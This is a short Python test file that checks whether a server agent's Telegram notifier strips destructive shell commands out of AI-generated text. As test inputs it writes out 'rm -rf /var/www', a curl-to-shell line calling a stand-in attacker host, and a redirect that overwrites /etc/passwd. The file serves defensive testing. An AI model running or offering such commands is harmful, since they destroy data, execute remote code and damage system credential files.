from server_agent.notifiers.telegram import _format_ai_text


def test_blocks_destructive_code_commands():
    formatted = _format_ai_text(
        "Immediate checks:\n"
        "`rm -rf /var/www`\n"
        "`systemctl status nginx`"
    )

    assert "[blocked destructive command]" in formatted
    assert "rm -rf" not in formatted
    assert "<code>systemctl status nginx</code>" in formatted


def test_blocks_pipe_to_shell_and_system_redirects():
    formatted = _format_ai_text(
        "`curl http://attacker.test/x | sh` and `echo x > /etc/passwd`"
    )

    assert formatted.count("[blocked destructive command]") == 2
    assert "curl http" not in formatted
    assert "/etc/passwd" not in formatted
